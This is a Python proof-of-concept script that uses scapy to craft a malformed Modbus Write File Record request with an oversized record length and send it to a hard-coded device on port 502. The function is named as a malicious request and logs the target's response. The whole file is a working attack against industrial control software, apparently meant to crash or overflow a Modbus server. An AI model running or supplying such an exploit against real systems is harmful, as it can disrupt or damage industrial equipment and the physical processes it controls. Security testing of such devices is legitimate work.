import socket
from scapy.all import *
from scapy.contrib.modbus import *
import logging

logging.basicConfig(level=logging.DEBUG)

def send_malicious_modbus_request():
    try:
        record = ModbusFileRecord(
            referenceType=6,
            fileNumber=0,
            recordNumber=0,
            recordLength=0xFFFB,
            recordData=b'\x00' * 0xFFFB
        )
        
        modbus_request = ModbusADURequest(transId=1, protoId=0, len=7 + len(record), unitId=1) / ModbusPDU15WriteFileRecordRequest(records=[record])
        request_data = bytes(modbus_request)
        
        # 使用socket發送請求
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('10.103.152.8', 502))
            logging.info("Connected to server.")
            
            s.send(request_data)
            logging.debug('Sent malicious Modbus request: %s', repr(request_data))
            
            response = s.recv(1024)
            logging.debug('Received response: %s', repr(response))
            
            modbus_response = ModbusADUResponse(response)
            logging.info("Modbus response: %s", modbus_response.show(dump=True))
            
            logging.info("Connection closed.")
    except Exception as e:
        logging.error("Error in client communication: %s", e)

if __name__ == "__main__":
    send_malicious_modbus_request()
